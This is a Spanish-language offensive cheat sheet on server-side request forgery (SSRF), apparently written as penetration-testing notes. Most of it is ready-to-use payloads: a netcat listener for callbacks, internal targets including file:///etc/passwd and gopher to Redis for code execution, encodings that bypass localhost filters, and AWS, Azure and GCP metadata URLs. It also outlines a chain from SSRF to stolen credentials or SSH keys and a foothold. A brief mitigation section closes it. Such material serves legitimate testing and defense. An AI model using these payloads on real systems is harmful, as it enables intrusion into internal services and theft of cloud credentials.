# SSRF (Server-Side Request Forgery)

La app hace peticiones a una URL que tú controlas (importar imagen desde URL,
webhooks, "fetch", monitores, previews). Objetivo: alcanzar servicios internos.

## Detección

Parámetros tipo `url=`, `link=`, `src=`, `path=`, `dest=`, `feed=`, `host=`.

```
http://TU_IP:PORT/              → ¿llega la petición a tu listener? (SSRF confirmado)
```

```bash
nc -lvnp PORT    # observa el callback del servidor víctima
```

## Objetivos internos

```
http://127.0.0.1/            http://localhost/
http://127.0.0.1:8080/       (servicios solo-locales)
http://127.0.0.1:3306/ ...   (fingerprint de puertos internos)
file:///etc/passwd           (si el fetch soporta file://)
gopher://127.0.0.1:6379/...  (hablar con Redis/otros — SSRF a RCE)
```

## Bypass de filtros localhost

Cuando bloquean `127.0.0.1` / `localhost`:

```
http://0.0.0.0/
http://0177.0.0.1/            (octal)
http://2130706433/            (decimal de 127.0.0.1)
http://127.1/
http://[::1]/                 (IPv6)
http://localtest.me/          (resuelve a 127.0.0.1)
http://127.0.0.1.nip.io/
http://victima@127.0.0.1/     (userinfo)
http://127.0.0.1#@evil/       (fragment)
```

Redirección: aloja un 302 en tu servidor que apunte a `http://127.0.0.1/`.

## Cloud metadata (si aplica)

```
http://169.254.169.254/latest/meta-data/            (AWS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Azure, con header)
http://metadata.google.internal/computeMetadata/v1/   (GCP, header Metadata-Flavor)
```

## Exfiltración de datos vía SSRF

Si la respuesta del fetch interno se refleja o guarda (p.ej. como "imagen"
descargada), puedes leer paneles internos, FTP interno, o endpoints de API que
exponen credenciales. Patrón: SSRF → leer servicio interno → obtener creds/clave
SSH → foothold.

## Mitigación

Allowlist de dominios/esquemas, resolver DNS y validar la IP final (no solo el
string), bloquear rangos privados/link-local, deshabilitar redirects, no reflejar
la respuesta.
